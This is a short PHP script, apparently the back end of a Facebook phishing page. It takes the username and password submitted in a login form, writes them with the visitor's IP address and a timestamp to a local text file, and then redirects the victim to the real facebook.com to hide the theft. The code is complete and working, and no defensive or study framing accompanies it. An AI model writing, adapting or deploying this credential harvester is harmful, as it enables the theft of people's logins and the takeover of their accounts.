<?php
if ($_SERVER["REQUEST_METHOD"] == "POST") {
    $username = $_POST['username'] ?? 'brak_username';
    $password = $_POST['password'] ?? 'brak_password';
    $ip = $_SERVER['REMOTE_ADDR'];
    $timestamp = date("Y-m-d H:i:s");

    $data = "[$timestamp] IP: $ip | Username: $username | Password: $password\n";

    file_put_contents("dane.txt", $data, FILE_APPEND);

    header("Location: https://www.facebook.com/");
    exit();
}
?>
